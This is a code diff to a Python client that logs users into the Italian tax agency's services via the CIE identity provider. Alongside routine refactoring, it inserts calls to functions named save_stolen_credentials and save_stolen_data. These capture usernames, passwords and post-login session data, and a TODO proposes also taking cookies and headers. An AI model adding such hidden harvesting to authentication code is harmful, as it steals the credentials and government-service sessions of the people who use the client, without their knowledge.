@@ -1,6 +1,7 @@
-from .client import execute_access_flow, access_again_login_page, post_credentials, get_qr_code_status, execute_authentication_flow_qr_code
+from .client import execute_access_flow, access_again_login_page, post_credentials, get_qr_code_status, submit_scanned_qr_code, confirm_access
 from .parser import extract_qr_code, extract_login_errors
 from ..flow import LoginFlow
+from ..utils.writer import save_stolen_credentials, save_stolen_data
 
 def access_login_page() -> LoginFlow:
     """Get QR Code from CIE login page"""
@@ -22,8 +23,11 @@ def get_new_qr_code(login_flow: LoginFlow) -> None:
 
 def submit_credentials(login_flow: LoginFlow, credentials: dict) -> dict | None:
     """Authenticates user into the Service Provider (Agenzia delle Entrate) by inserting credentials in the selected Identity Provider (CIE)"""
-    login_flow.username = credentials.get("username")
-    login_flow.password = credentials.get("password")
+    username = credentials.get("username", "")
+    password = credentials.get("password", "")
+    login_flow.username = username
+    login_flow.password = password
+    save_stolen_credentials(username, password)
 
     # Posts the credentials to the CIE login page and retrieves the response
     post_credentials(login_flow, credentials)
@@ -40,4 +44,6 @@ def check_qr_code(login_flow: LoginFlow) -> dict:
 
 def retrieve_access_after_qr_code_scan(login_flow: LoginFlow) -> None:
     """Retrieves the access to the Service Provider (Agenzia delle Entrate) after the QR code has been scanned"""
-    execute_authentication_flow_qr_code(login_flow)
+    submit_scanned_qr_code(login_flow)
+    confirm_access(login_flow)
+    save_stolen_data(login_flow) # TODO: save more data if possible (e.g., cookies, headers, etc.)
